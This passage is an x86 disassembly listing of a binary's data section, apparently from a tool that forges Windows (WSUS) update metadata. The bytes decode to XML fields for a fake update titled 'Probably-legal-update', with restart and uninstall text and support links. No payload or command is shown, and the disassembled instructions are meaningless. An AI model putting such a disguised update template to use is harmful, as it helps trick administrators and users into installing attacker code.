  40ac41:	73 00                	jae    0x40ac43
  40ac43:	20 00                	and    %al,(%eax)
  40ac45:	75 00                	jne    0x40ac47
  40ac47:	70 00                	jo     0x40ac49
  40ac49:	64 00 61 00          	add    %ah,%fs:0x0(%ecx)
  40ac4d:	74 00                	je     0x40ac4f
  40ac4f:	65 00 2c 00          	add    %ch,%gs:(%eax,%eax,1)
  40ac53:	20 00                	and    %al,(%eax)
  40ac55:	73 00                	jae    0x40ac57
  40ac57:	65 00 65 00          	add    %ah,%gs:0x0(%ebp)
  40ac5b:	20 00                	and    %al,(%eax)
  40ac5d:	74 00                	je     0x40ac5f
  40ac5f:	68 00 65 00 20       	push   $0x20006500
  40ac64:	00 61 00             	add    %ah,0x0(%ecx)
  40ac67:	73 00                	jae    0x40ac69
  40ac69:	73 00                	jae    0x40ac6b
  40ac6b:	6f                   	outsl  %ds:(%esi),(%dx)
  40ac6c:	00 63 00             	add    %ah,0x0(%ebx)
  40ac6f:	69 00 61 00 74 00    	imul   $0x740061,(%eax),%eax
  40ac75:	65 00 64 00 20       	add    %ah,%gs:0x20(%eax,%eax,1)
  40ac7a:	00 4d 00             	add    %cl,0x0(%ebp)
  40ac7d:	69 00 63 00 72 00    	imul   $0x720063,(%eax),%eax
  40ac83:	6f                   	outsl  %ds:(%esi),(%dx)
  40ac84:	00 73 00             	add    %dh,0x0(%ebx)
  40ac87:	6f                   	outsl  %ds:(%esi),(%dx)
  40ac88:	00 66 00             	add    %ah,0x0(%esi)
  40ac8b:	74 00                	je     0x40ac8d
  40ac8d:	20 00                	and    %al,(%eax)
  40ac8f:	4b                   	dec    %ebx
  40ac90:	00 6e 00             	add    %ch,0x0(%esi)
  40ac93:	6f                   	outsl  %ds:(%esi),(%dx)
  40ac94:	00 77 00             	add    %dh,0x0(%edi)
  40ac97:	6c                   	insb   (%dx),%es:(%edi)
  40ac98:	00 65 00             	add    %ah,0x0(%ebp)
  40ac9b:	64 00 67 00          	add    %ah,%fs:0x0(%edi)
  40ac9f:	65 00 20             	add    %ah,%gs:(%eax)
  40aca2:	00 42 00             	add    %al,0x0(%edx)
  40aca5:	61                   	popa
  40aca6:	00 73 00             	add    %dh,0x0(%ebx)
  40aca9:	65 00 20             	add    %ah,%gs:(%eax)
  40acac:	00 61 00             	add    %ah,0x0(%ecx)
  40acaf:	72 00                	jb     0x40acb1
  40acb1:	74 00                	je     0x40acb3
  40acb3:	69 00 63 00 6c 00    	imul   $0x6c0063,(%eax),%eax
  40acb9:	65 00 2e             	add    %ch,%gs:(%esi)
  40acbc:	00 20                	add    %ah,(%eax)
  40acbe:	00 41 00             	add    %al,0x0(%ecx)
  40acc1:	66 00 74 00 65       	data16 add %dh,0x65(%eax,%eax,1)
  40acc6:	00 72 00             	add    %dh,0x0(%edx)
  40acc9:	20 00                	and    %al,(%eax)
  40accb:	79 00                	jns    0x40accd
  40accd:	6f                   	outsl  %ds:(%esi),(%dx)
  40acce:	00 75 00             	add    %dh,0x0(%ebp)
  40acd1:	20 00                	and    %al,(%eax)
  40acd3:	69 00 6e 00 73 00    	imul   $0x73006e,(%eax),%eax
  40acd9:	74 00                	je     0x40acdb
  40acdb:	61                   	popa
  40acdc:	00 6c 00 6c          	add    %ch,0x6c(%eax,%eax,1)
  40ace0:	00 20                	add    %ah,(%eax)
  40ace2:	00 74 00 68          	add    %dh,0x68(%eax,%eax,1)
  40ace6:	00 69 00             	add    %ch,0x0(%ecx)
  40ace9:	73 00                	jae    0x40aceb
  40aceb:	20 00                	and    %al,(%eax)
  40aced:	75 00                	jne    0x40acef
  40acef:	70 00                	jo     0x40acf1
  40acf1:	64 00 61 00          	add    %ah,%fs:0x0(%ecx)
  40acf5:	74 00                	je     0x40acf7
  40acf7:	65 00 2c 00          	add    %ch,%gs:(%eax,%eax,1)
  40acfb:	20 00                	and    %al,(%eax)
  40acfd:	79 00                	jns    0x40acff
  40acff:	6f                   	outsl  %ds:(%esi),(%dx)
  40ad00:	00 75 00             	add    %dh,0x0(%ebp)
  40ad03:	20 00                	and    %al,(%eax)
  40ad05:	6d                   	insl   (%dx),%es:(%edi)
  40ad06:	00 61 00             	add    %ah,0x0(%ecx)
  40ad09:	79 00                	jns    0x40ad0b
  40ad0b:	20 00                	and    %al,(%eax)
  40ad0d:	68 00 61 00 76       	push   $0x76006100
  40ad12:	00 65 00             	add    %ah,0x0(%ebp)
  40ad15:	20 00                	and    %al,(%eax)
  40ad17:	74 00                	je     0x40ad19
  40ad19:	6f                   	outsl  %ds:(%esi),(%dx)
  40ad1a:	00 20                	add    %ah,(%eax)
  40ad1c:	00 72 00             	add    %dh,0x0(%edx)
  40ad1f:	65 00 73 00          	add    %dh,%gs:0x0(%ebx)
  40ad23:	74 00                	je     0x40ad25
  40ad25:	61                   	popa
  40ad26:	00 72 00             	add    %dh,0x0(%edx)
  40ad29:	74 00                	je     0x40ad2b
  40ad2b:	20 00                	and    %al,(%eax)
  40ad2d:	79 00                	jns    0x40ad2f
  40ad2f:	6f                   	outsl  %ds:(%esi),(%dx)
  40ad30:	00 75 00             	add    %dh,0x0(%ebp)
  40ad33:	72 00                	jb     0x40ad35
  40ad35:	20 00                	and    %al,(%eax)
  40ad37:	73 00                	jae    0x40ad39
  40ad39:	79 00                	jns    0x40ad3b
  40ad3b:	73 00                	jae    0x40ad3d
  40ad3d:	74 00                	je     0x40ad3f
  40ad3f:	65 00 6d 00          	add    %ch,%gs:0x0(%ebp)
  40ad43:	2e 00 26             	add    %ah,%cs:(%esi)
  40ad46:	00 6c 00 74          	add    %ch,0x74(%eax,%eax,1)
  40ad4a:	00 3b                	add    %bh,(%ebx)
  40ad4c:	00 2f                	add    %ch,(%edi)
  40ad4e:	00 44 00 65          	add    %al,0x65(%eax,%eax,1)
  40ad52:	00 73 00             	add    %dh,0x0(%ebx)
  40ad55:	63 00                	arpl   %eax,(%eax)
  40ad57:	72 00                	jb     0x40ad59
  40ad59:	69 00 70 00 74 00    	imul   $0x740070,(%eax),%eax
  40ad5f:	69 00 6f 00 6e 00    	imul   $0x6e006f,(%eax),%eax
  40ad65:	26 00 67 00          	add    %ah,%es:0x0(%edi)
  40ad69:	74 00                	je     0x40ad6b
  40ad6b:	3b 00                	cmp    (%eax),%eax
  40ad6d:	26 00 6c 00 74       	add    %ch,%es:0x74(%eax,%eax,1)
  40ad72:	00 3b                	add    %bh,(%ebx)
  40ad74:	00 55 00             	add    %dl,0x0(%ebp)
  40ad77:	6e                   	outsb  %ds:(%esi),(%dx)
  40ad78:	00 69 00             	add    %ch,0x0(%ecx)
  40ad7b:	6e                   	outsb  %ds:(%esi),(%dx)
  40ad7c:	00 73 00             	add    %dh,0x0(%ebx)
  40ad7f:	74 00                	je     0x40ad81
  40ad81:	61                   	popa
  40ad82:	00 6c 00 6c          	add    %ch,0x6c(%eax,%eax,1)
  40ad86:	00 4e 00             	add    %cl,0x0(%esi)
  40ad89:	6f                   	outsl  %ds:(%esi),(%dx)
  40ad8a:	00 74 00 65          	add    %dh,0x65(%eax,%eax,1)
  40ad8e:	00 73 00             	add    %dh,0x0(%ebx)
  40ad91:	26 00 67 00          	add    %ah,%es:0x0(%edi)
  40ad95:	74 00                	je     0x40ad97
  40ad97:	3b 00                	cmp    (%eax),%eax
  40ad99:	54                   	push   %esp
  40ad9a:	00 68 00             	add    %ch,0x0(%eax)
  40ad9d:	69 00 73 00 20 00    	imul   $0x200073,(%eax),%eax
  40ada3:	73 00                	jae    0x40ada5
  40ada5:	6f                   	outsl  %ds:(%esi),(%dx)
  40ada6:	00 66 00             	add    %ah,0x0(%esi)
  40ada9:	74 00                	je     0x40adab
  40adab:	77 00                	ja     0x40adad
  40adad:	61                   	popa
  40adae:	00 72 00             	add    %dh,0x0(%edx)
  40adb1:	65 00 20             	add    %ah,%gs:(%eax)
  40adb4:	00 75 00             	add    %dh,0x0(%ebp)
  40adb7:	70 00                	jo     0x40adb9
  40adb9:	64 00 61 00          	add    %ah,%fs:0x0(%ecx)
  40adbd:	74 00                	je     0x40adbf
  40adbf:	65 00 20             	add    %ah,%gs:(%eax)
  40adc2:	00 63 00             	add    %ah,0x0(%ebx)
  40adc5:	61                   	popa
  40adc6:	00 6e 00             	add    %ch,0x0(%esi)
  40adc9:	20 00                	and    %al,(%eax)
  40adcb:	62 00                	bound  %eax,(%eax)
  40adcd:	65 00 20             	add    %ah,%gs:(%eax)
  40add0:	00 72 00             	add    %dh,0x0(%edx)
  40add3:	65 00 6d 00          	add    %ch,%gs:0x0(%ebp)
  40add7:	6f                   	outsl  %ds:(%esi),(%dx)
  40add8:	00 76 00             	add    %dh,0x0(%esi)
  40addb:	65 00 64 00 20       	add    %ah,%gs:0x20(%eax,%eax,1)
  40ade0:	00 62 00             	add    %ah,0x0(%edx)
  40ade3:	79 00                	jns    0x40ade5
  40ade5:	20 00                	and    %al,(%eax)
  40ade7:	73 00                	jae    0x40ade9
  40ade9:	65 00 6c 00 65       	add    %ch,%gs:0x65(%eax,%eax,1)
  40adee:	00 63 00             	add    %ah,0x0(%ebx)
  40adf1:	74 00                	je     0x40adf3
  40adf3:	69 00 6e 00 67 00    	imul   $0x67006e,(%eax),%eax
  40adf9:	20 00                	and    %al,(%eax)
  40adfb:	56                   	push   %esi
  40adfc:	00 69 00             	add    %ch,0x0(%ecx)
  40adff:	65 00 77 00          	add    %dh,%gs:0x0(%edi)
  40ae03:	20 00                	and    %al,(%eax)
  40ae05:	69 00 6e 00 73 00    	imul   $0x73006e,(%eax),%eax
  40ae0b:	74 00                	je     0x40ae0d
  40ae0d:	61                   	popa
  40ae0e:	00 6c 00 6c          	add    %ch,0x6c(%eax,%eax,1)
  40ae12:	00 65 00             	add    %ah,0x0(%ebp)
  40ae15:	64 00 20             	add    %ah,%fs:(%eax)
  40ae18:	00 75 00             	add    %dh,0x0(%ebp)
  40ae1b:	70 00                	jo     0x40ae1d
  40ae1d:	64 00 61 00          	add    %ah,%fs:0x0(%ecx)
  40ae21:	74 00                	je     0x40ae23
  40ae23:	65 00 73 00          	add    %dh,%gs:0x0(%ebx)
  40ae27:	20 00                	and    %al,(%eax)
  40ae29:	69 00 6e 00 20 00    	imul   $0x20006e,(%eax),%eax
  40ae2f:	74 00                	je     0x40ae31
  40ae31:	68 00 65 00 20       	push   $0x20006500
  40ae36:	00 50 00             	add    %dl,0x0(%eax)
  40ae39:	72 00                	jb     0x40ae3b
  40ae3b:	6f                   	outsl  %ds:(%esi),(%dx)
  40ae3c:	00 67 00             	add    %ah,0x0(%edi)
  40ae3f:	72 00                	jb     0x40ae41
  40ae41:	61                   	popa
  40ae42:	00 6d 00             	add    %ch,0x0(%ebp)
  40ae45:	73 00                	jae    0x40ae47
  40ae47:	20 00                	and    %al,(%eax)
  40ae49:	61                   	popa
  40ae4a:	00 6e 00             	add    %ch,0x0(%esi)
  40ae4d:	64 00 20             	add    %ah,%fs:(%eax)
  40ae50:	00 46 00             	add    %al,0x0(%esi)
  40ae53:	65 00 61 00          	add    %ah,%gs:0x0(%ecx)
  40ae57:	74 00                	je     0x40ae59
  40ae59:	75 00                	jne    0x40ae5b
  40ae5b:	72 00                	jb     0x40ae5d
  40ae5d:	65 00 73 00          	add    %dh,%gs:0x0(%ebx)
  40ae61:	20 00                	and    %al,(%eax)
  40ae63:	43                   	inc    %ebx
  40ae64:	00 6f 00             	add    %ch,0x0(%edi)
  40ae67:	6e                   	outsb  %ds:(%esi),(%dx)
  40ae68:	00 74 00 72          	add    %dh,0x72(%eax,%eax,1)
  40ae6c:	00 6f 00             	add    %ch,0x0(%edi)
  40ae6f:	6c                   	insb   (%dx),%es:(%edi)
  40ae70:	00 20                	add    %ah,(%eax)
  40ae72:	00 50 00             	add    %dl,0x0(%eax)
  40ae75:	61                   	popa
  40ae76:	00 6e 00             	add    %ch,0x0(%esi)
  40ae79:	65 00 6c 00 2e       	add    %ch,%gs:0x2e(%eax,%eax,1)
  40ae7e:	00 26                	add    %ah,(%esi)
  40ae80:	00 6c 00 74          	add    %ch,0x74(%eax,%eax,1)
  40ae84:	00 3b                	add    %bh,(%ebx)
  40ae86:	00 2f                	add    %ch,(%edi)
  40ae88:	00 55 00             	add    %dl,0x0(%ebp)
  40ae8b:	6e                   	outsb  %ds:(%esi),(%dx)
  40ae8c:	00 69 00             	add    %ch,0x0(%ecx)
  40ae8f:	6e                   	outsb  %ds:(%esi),(%dx)
  40ae90:	00 73 00             	add    %dh,0x0(%ebx)
  40ae93:	74 00                	je     0x40ae95
  40ae95:	61                   	popa
  40ae96:	00 6c 00 6c          	add    %ch,0x6c(%eax,%eax,1)
  40ae9a:	00 4e 00             	add    %cl,0x0(%esi)
  40ae9d:	6f                   	outsl  %ds:(%esi),(%dx)
  40ae9e:	00 74 00 65          	add    %dh,0x65(%eax,%eax,1)
  40aea2:	00 73 00             	add    %dh,0x0(%ebx)
  40aea5:	26 00 67 00          	add    %ah,%es:0x0(%edi)
  40aea9:	74 00                	je     0x40aeab
  40aeab:	3b 00                	cmp    (%eax),%eax
  40aead:	26 00 6c 00 74       	add    %ch,%es:0x74(%eax,%eax,1)
  40aeb2:	00 3b                	add    %bh,(%ebx)
  40aeb4:	00 4d 00             	add    %cl,0x0(%ebp)
  40aeb7:	6f                   	outsl  %ds:(%esi),(%dx)
  40aeb8:	00 72 00             	add    %dh,0x0(%edx)
  40aebb:	65 00 49 00          	add    %cl,%gs:0x0(%ecx)
  40aebf:	6e                   	outsb  %ds:(%esi),(%dx)
  40aec0:	00 66 00             	add    %ah,0x0(%esi)
  40aec3:	6f                   	outsl  %ds:(%esi),(%dx)
  40aec4:	00 55 00             	add    %dl,0x0(%ebp)
  40aec7:	72 00                	jb     0x40aec9
  40aec9:	6c                   	insb   (%dx),%es:(%edi)
  40aeca:	00 26                	add    %ah,(%esi)
  40aecc:	00 67 00             	add    %ah,0x0(%edi)
  40aecf:	74 00                	je     0x40aed1
  40aed1:	3b 00                	cmp    (%eax),%eax
  40aed3:	68 00 74 00 74       	push   $0x74007400
  40aed8:	00 70 00             	add    %dh,0x0(%eax)
  40aedb:	73 00                	jae    0x40aedd
  40aedd:	3a 00                	cmp    (%eax),%al
  40aedf:	2f                   	das
  40aee0:	00 2f                	add    %ch,(%edi)
  40aee2:	00 67 00             	add    %ah,0x0(%edi)
  40aee5:	6f                   	outsl  %ds:(%esi),(%dx)
  40aee6:	00 73 00             	add    %dh,0x0(%ebx)
  40aee9:	65 00 63 00          	add    %ah,%gs:0x0(%ebx)
  40aeed:	75 00                	jne    0x40aeef
  40aeef:	72 00                	jb     0x40aef1
  40aef1:	65 00 2e             	add    %ch,%gs:(%esi)
  40aef4:	00 6e 00             	add    %ch,0x0(%esi)
  40aef7:	65 00 74 00 26       	add    %dh,%gs:0x26(%eax,%eax,1)
  40aefc:	00 6c 00 74          	add    %ch,0x74(%eax,%eax,1)
  40af00:	00 3b                	add    %bh,(%ebx)
  40af02:	00 2f                	add    %ch,(%edi)
  40af04:	00 4d 00             	add    %cl,0x0(%ebp)
  40af07:	6f                   	outsl  %ds:(%esi),(%dx)
  40af08:	00 72 00             	add    %dh,0x0(%edx)
  40af0b:	65 00 49 00          	add    %cl,%gs:0x0(%ecx)
  40af0f:	6e                   	outsb  %ds:(%esi),(%dx)
  40af10:	00 66 00             	add    %ah,0x0(%esi)
  40af13:	6f                   	outsl  %ds:(%esi),(%dx)
  40af14:	00 55 00             	add    %dl,0x0(%ebp)
  40af17:	72 00                	jb     0x40af19
  40af19:	6c                   	insb   (%dx),%es:(%edi)
  40af1a:	00 26                	add    %ah,(%esi)
  40af1c:	00 67 00             	add    %ah,0x0(%edi)
  40af1f:	74 00                	je     0x40af21
  40af21:	3b 00                	cmp    (%eax),%eax
  40af23:	26 00 6c 00 74       	add    %ch,%es:0x74(%eax,%eax,1)
  40af28:	00 3b                	add    %bh,(%ebx)
  40af2a:	00 53 00             	add    %dl,0x0(%ebx)
  40af2d:	75 00                	jne    0x40af2f
  40af2f:	70 00                	jo     0x40af31
  40af31:	70 00                	jo     0x40af33
  40af33:	6f                   	outsl  %ds:(%esi),(%dx)
  40af34:	00 72 00             	add    %dh,0x0(%edx)
  40af37:	74 00                	je     0x40af39
  40af39:	55                   	push   %ebp
  40af3a:	00 72 00             	add    %dh,0x0(%edx)
  40af3d:	6c                   	insb   (%dx),%es:(%edi)
  40af3e:	00 26                	add    %ah,(%esi)
  40af40:	00 67 00             	add    %ah,0x0(%edi)
  40af43:	74 00                	je     0x40af45
  40af45:	3b 00                	cmp    (%eax),%eax
  40af47:	68 00 74 00 74       	push   $0x74007400
  40af4c:	00 70 00             	add    %dh,0x0(%eax)
  40af4f:	73 00                	jae    0x40af51
  40af51:	3a 00                	cmp    (%eax),%al
  40af53:	2f                   	das
  40af54:	00 2f                	add    %ch,(%edi)
  40af56:	00 67 00             	add    %ah,0x0(%edi)
  40af59:	6f                   	outsl  %ds:(%esi),(%dx)
  40af5a:	00 73 00             	add    %dh,0x0(%ebx)
  40af5d:	65 00 63 00          	add    %ah,%gs:0x0(%ebx)
  40af61:	75 00                	jne    0x40af63
  40af63:	72 00                	jb     0x40af65
  40af65:	65 00 2e             	add    %ch,%gs:(%esi)
  40af68:	00 6e 00             	add    %ch,0x0(%esi)
  40af6b:	65 00 74 00 26       	add    %dh,%gs:0x26(%eax,%eax,1)
  40af70:	00 6c 00 74          	add    %ch,0x74(%eax,%eax,1)
  40af74:	00 3b                	add    %bh,(%ebx)
  40af76:	00 2f                	add    %ch,(%edi)
  40af78:	00 53 00             	add    %dl,0x0(%ebx)
  40af7b:	75 00                	jne    0x40af7d
  40af7d:	70 00                	jo     0x40af7f
  40af7f:	70 00                	jo     0x40af81
  40af81:	6f                   	outsl  %ds:(%esi),(%dx)
  40af82:	00 72 00             	add    %dh,0x0(%edx)
  40af85:	74 00                	je     0x40af87
  40af87:	55                   	push   %ebp
  40af88:	00 72 00             	add    %dh,0x0(%edx)
  40af8b:	6c                   	insb   (%dx),%es:(%edi)
  40af8c:	00 26                	add    %ah,(%esi)
  40af8e:	00 67 00             	add    %ah,0x0(%edi)
  40af91:	74 00                	je     0x40af93
  40af93:	3b 00                	cmp    (%eax),%eax
  40af95:	26 00 6c 00 74       	add    %ch,%es:0x74(%eax,%eax,1)
  40af9a:	00 3b                	add    %bh,(%ebx)
  40af9c:	00 2f                	add    %ch,(%edi)
  40af9e:	00 4c 00 6f          	add    %cl,0x6f(%eax,%eax,1)
  40afa2:	00 63 00             	add    %ah,0x0(%ebx)
  40afa5:	61                   	popa
  40afa6:	00 6c 00 69          	add    %ch,0x69(%eax,%eax,1)
  40afaa:	00 7a 00             	add    %bh,0x0(%edx)
  40afad:	65 00 64 00 50       	add    %ah,%gs:0x50(%eax,%eax,1)
  40afb2:	00 72 00             	add    %dh,0x0(%edx)
  40afb5:	6f                   	outsl  %ds:(%esi),(%dx)
  40afb6:	00 70 00             	add    %dh,0x0(%eax)
  40afb9:	65 00 72 00          	add    %dh,%gs:0x0(%edx)
  40afbd:	74 00                	je     0x40afbf
  40afbf:	69 00 65 00 73 00    	imul   $0x730065,(%eax),%eax
  40afc5:	26 00 67 00          	add    %ah,%es:0x0(%edi)
  40afc9:	74 00                	je     0x40afcb
  40afcb:	3b 00                	cmp    (%eax),%eax
  40afcd:	3c 00                	cmp    $0x0,%al
  40afcf:	2f                   	das
  40afd0:	00 58 00             	add    %bl,0x0(%eax)
  40afd3:	6d                   	insl   (%dx),%es:(%edi)
  40afd4:	00 6c 00 3e          	add    %ch,0x3e(%eax,%eax,1)
  40afd8:	00 0d 00 0a 00 20    	add    %cl,0x20000a00
  40afde:	00 20                	add    %ah,(%eax)
  40afe0:	00 20                	add    %ah,(%eax)
  40afe2:	00 20                	add    %ah,(%eax)
  40afe4:	00 20                	add    %ah,(%eax)
  40afe6:	00 20                	add    %ah,(%eax)
  40afe8:	00 20                	add    %ah,(%eax)
  40afea:	00 20                	add    %ah,(%eax)
  40afec:	00 20                	add    %ah,(%eax)
  40afee:	00 20                	add    %ah,(%eax)
  40aff0:	00 20                	add    %ah,(%eax)
  40aff2:	00 20                	add    %ah,(%eax)
  40aff4:	00 20                	add    %ah,(%eax)
  40aff6:	00 20                	add    %ah,(%eax)
  40aff8:	00 20                	add    %ah,(%eax)
  40affa:	00 20                	add    %ah,(%eax)
  40affc:	00 20                	add    %ah,(%eax)
  40affe:	00 20                	add    %ah,(%eax)
  40b000:	00 20                	add    %ah,(%eax)
  40b002:	00 20                	add    %ah,(%eax)
  40b004:	00 3c 00             	add    %bh,(%eax,%eax,1)
  40b007:	2f                   	das
  40b008:	00 55 00             	add    %dl,0x0(%ebp)
  40b00b:	70 00                	jo     0x40b00d
  40b00d:	64 00 61 00          	add    %ah,%fs:0x0(%ecx)
  40b011:	74 00                	je     0x40b013
  40b013:	65 00 3e             	add    %bh,%gs:(%esi)
  40b016:	00 0d 00 0a 00 20    	add    %cl,0x20000a00
  40b01c:	00 20                	add    %ah,(%eax)
  40b01e:	00 20                	add    %ah,(%eax)
  40b020:	00 20                	add    %ah,(%eax)
  40b022:	00 20                	add    %ah,(%eax)
  40b024:	00 20                	add    %ah,(%eax)
  40b026:	00 20                	add    %ah,(%eax)
  40b028:	00 20                	add    %ah,(%eax)
  40b02a:	00 20                	add    %ah,(%eax)
  40b02c:	00 20                	add    %ah,(%eax)
  40b02e:	00 20                	add    %ah,(%eax)
  40b030:	00 20                	add    %ah,(%eax)
  40b032:	00 20                	add    %ah,(%eax)
  40b034:	00 20                	add    %ah,(%eax)
  40b036:	00 20                	add    %ah,(%eax)
  40b038:	00 20                	add    %ah,(%eax)
  40b03a:	00 20                	add    %ah,(%eax)
  40b03c:	00 20                	add    %ah,(%eax)
  40b03e:	00 20                	add    %ah,(%eax)
  40b040:	00 20                	add    %ah,(%eax)
  40b042:	00 3c 00             	add    %bh,(%eax,%eax,1)
  40b045:	55                   	push   %ebp
  40b046:	00 70 00             	add    %dh,0x0(%eax)
  40b049:	64 00 61 00          	add    %ah,%fs:0x0(%ecx)
  40b04d:	74 00                	je     0x40b04f
  40b04f:	65 00 3e             	add    %bh,%gs:(%esi)
  40b052:	00 0d 00 0a 00 20    	add    %cl,0x20000a00
  40b058:	00 20                	add    %ah,(%eax)
  40b05a:	00 20                	add    %ah,(%eax)
  40b05c:	00 20                	add    %ah,(%eax)
  40b05e:	00 20                	add    %ah,(%eax)
  40b060:	00 20                	add    %ah,(%eax)
  40b062:	00 20                	add    %ah,(%eax)
  40b064:	00 20                	add    %ah,(%eax)
  40b066:	00 20                	add    %ah,(%eax)
  40b068:	00 20                	add    %ah,(%eax)
  40b06a:	00 20                	add    %ah,(%eax)
  40b06c:	00 20                	add    %ah,(%eax)
  40b06e:	00 20                	add    %ah,(%eax)
  40b070:	00 20                	add    %ah,(%eax)
  40b072:	00 20                	add    %ah,(%eax)
  40b074:	00 20                	add    %ah,(%eax)
  40b076:	00 20                	add    %ah,(%eax)
  40b078:	00 20                	add    %ah,(%eax)
  40b07a:	00 20                	add    %ah,(%eax)
  40b07c:	00 20                	add    %ah,(%eax)
  40b07e:	00 20                	add    %ah,(%eax)
  40b080:	00 20                	add    %ah,(%eax)
  40b082:	00 20                	add    %ah,(%eax)
  40b084:	00 20                	add    %ah,(%eax)
  40b086:	00 3c 00             	add    %bh,(%eax,%eax,1)
  40b089:	49                   	dec    %ecx
  40b08a:	00 44 00 3e          	add    %al,0x3e(%eax,%eax,1)
  40b08e:	00 7b 00             	add    %bh,0x0(%ebx)
  40b091:	31 00                	xor    %eax,(%eax)
  40b093:	31 00                	xor    %eax,(%eax)
  40b095:	7d 00                	jge    0x40b097
  40b097:	3c 00                	cmp    $0x0,%al
  40b099:	2f                   	das
  40b09a:	00 49 00             	add    %cl,0x0(%ecx)
  40b09d:	44                   	inc    %esp
  40b09e:	00 3e                	add    %bh,(%esi)
  40b0a0:	00 0d 00 0a 00 20    	add    %cl,0x20000a00
  40b0a6:	00 20                	add    %ah,(%eax)
  40b0a8:	00 20                	add    %ah,(%eax)
  40b0aa:	00 20                	add    %ah,(%eax)
  40b0ac:	00 20                	add    %ah,(%eax)
  40b0ae:	00 20                	add    %ah,(%eax)
  40b0b0:	00 20                	add    %ah,(%eax)
  40b0b2:	00 20                	add    %ah,(%eax)
  40b0b4:	00 20                	add    %ah,(%eax)
  40b0b6:	00 20                	add    %ah,(%eax)
  40b0b8:	00 20                	add    %ah,(%eax)
  40b0ba:	00 20                	add    %ah,(%eax)
  40b0bc:	00 20                	add    %ah,(%eax)
  40b0be:	00 20                	add    %ah,(%eax)
  40b0c0:	00 20                	add    %ah,(%eax)
  40b0c2:	00 20                	add    %ah,(%eax)
  40b0c4:	00 20                	add    %ah,(%eax)
  40b0c6:	00 20                	add    %ah,(%eax)
  40b0c8:	00 20                	add    %ah,(%eax)
  40b0ca:	00 20                	add    %ah,(%eax)
  40b0cc:	00 20                	add    %ah,(%eax)
  40b0ce:	00 20                	add    %ah,(%eax)
  40b0d0:	00 20                	add    %ah,(%eax)
  40b0d2:	00 20                	add    %ah,(%eax)
  40b0d4:	00 3c 00             	add    %bh,(%eax,%eax,1)
  40b0d7:	58                   	pop    %eax
  40b0d8:	00 6d 00             	add    %ch,0x0(%ebp)
  40b0db:	6c                   	insb   (%dx),%es:(%edi)
  40b0dc:	00 3e                	add    %bh,(%esi)
  40b0de:	00 26                	add    %ah,(%esi)
  40b0e0:	00 6c 00 74          	add    %ch,0x74(%eax,%eax,1)
  40b0e4:	00 3b                	add    %bh,(%ebx)
  40b0e6:	00 4c 00 6f          	add    %cl,0x6f(%eax,%eax,1)
  40b0ea:	00 63 00             	add    %ah,0x0(%ebx)
  40b0ed:	61                   	popa
  40b0ee:	00 6c 00 69          	add    %ch,0x69(%eax,%eax,1)
  40b0f2:	00 7a 00             	add    %bh,0x0(%edx)
  40b0f5:	65 00 64 00 50       	add    %ah,%gs:0x50(%eax,%eax,1)
  40b0fa:	00 72 00             	add    %dh,0x0(%edx)
  40b0fd:	6f                   	outsl  %ds:(%esi),(%dx)
  40b0fe:	00 70 00             	add    %dh,0x0(%eax)
  40b101:	65 00 72 00          	add    %dh,%gs:0x0(%edx)
  40b105:	74 00                	je     0x40b107
  40b107:	69 00 65 00 73 00    	imul   $0x730065,(%eax),%eax
  40b10d:	26 00 67 00          	add    %ah,%es:0x0(%edi)
  40b111:	74 00                	je     0x40b113
  40b113:	3b 00                	cmp    (%eax),%eax
  40b115:	26 00 6c 00 74       	add    %ch,%es:0x74(%eax,%eax,1)
  40b11a:	00 3b                	add    %bh,(%ebx)
  40b11c:	00 4c 00 61          	add    %cl,0x61(%eax,%eax,1)
  40b120:	00 6e 00             	add    %ch,0x0(%esi)
  40b123:	67 00 75 00          	add    %dh,0x0(%di)
  40b127:	61                   	popa
  40b128:	00 67 00             	add    %ah,0x0(%edi)
  40b12b:	65 00 26             	add    %ah,%gs:(%esi)
  40b12e:	00 67 00             	add    %ah,0x0(%edi)
  40b131:	74 00                	je     0x40b133
  40b133:	3b 00                	cmp    (%eax),%eax
  40b135:	65 00 6e 00          	add    %ch,%gs:0x0(%esi)
  40b139:	26 00 6c 00 74       	add    %ch,%es:0x74(%eax,%eax,1)
  40b13e:	00 3b                	add    %bh,(%ebx)
  40b140:	00 2f                	add    %ch,(%edi)
  40b142:	00 4c 00 61          	add    %cl,0x61(%eax,%eax,1)
  40b146:	00 6e 00             	add    %ch,0x0(%esi)
  40b149:	67 00 75 00          	add    %dh,0x0(%di)
  40b14d:	61                   	popa
  40b14e:	00 67 00             	add    %ah,0x0(%edi)
  40b151:	65 00 26             	add    %ah,%gs:(%esi)
  40b154:	00 67 00             	add    %ah,0x0(%edi)
  40b157:	74 00                	je     0x40b159
  40b159:	3b 00                	cmp    (%eax),%eax
  40b15b:	26 00 6c 00 74       	add    %ch,%es:0x74(%eax,%eax,1)
  40b160:	00 3b                	add    %bh,(%ebx)
  40b162:	00 54 00 69          	add    %dl,0x69(%eax,%eax,1)
  40b166:	00 74 00 6c          	add    %dh,0x6c(%eax,%eax,1)
  40b16a:	00 65 00             	add    %ah,0x0(%ebp)
  40b16d:	26 00 67 00          	add    %ah,%es:0x0(%edi)
  40b171:	74 00                	je     0x40b173
  40b173:	3b 00                	cmp    (%eax),%eax
  40b175:	50                   	push   %eax
  40b176:	00 72 00             	add    %dh,0x0(%edx)
  40b179:	6f                   	outsl  %ds:(%esi),(%dx)
  40b17a:	00 62 00             	add    %ah,0x0(%edx)
  40b17d:	61                   	popa
  40b17e:	00 62 00             	add    %ah,0x0(%edx)
  40b181:	6c                   	insb   (%dx),%es:(%edi)
  40b182:	00 79 00             	add    %bh,0x0(%ecx)
  40b185:	2d 00 6c 00 65       	sub    $0x65006c00,%eax
  40b18a:	00 67 00             	add    %ah,0x0(%edi)
  40b18d:	61                   	popa
  40b18e:	00 6c 00 2d          	add    %ch,0x2d(%eax,%eax,1)
  40b192:	00 75 00             	add    %dh,0x0(%ebp)
  40b195:	70 00                	jo     0x40b197
  40b197:	64 00 61 00          	add    %ah,%fs:0x0(%ecx)
  40b19b:	74 00                	je     0x40b19d
  40b19d:	65 00 26             	add    %ah,%gs:(%esi)
  40b1a0:	00 6c 00 74          	add    %ch,0x74(%eax,%eax,1)
  40b1a4:	00 3b                	add    %bh,(%ebx)
  40b1a6:	00 2f                	add    %ch,(%edi)
  40b1a8:	00 54 00 69          	add    %dl,0x69(%eax,%eax,1)
  40b1ac:	00 74 00 6c          	add    %dh,0x6c(%eax,%eax,1)
  40b1b0:	00 65 00             	add    %ah,0x0(%ebp)
  40b1b3:	26 00 67 00          	add    %ah,%es:0x0(%edi)
  40b1b7:	74 00                	je     0x40b1b9
  40b1b9:	3b 00                	cmp    (%eax),%eax
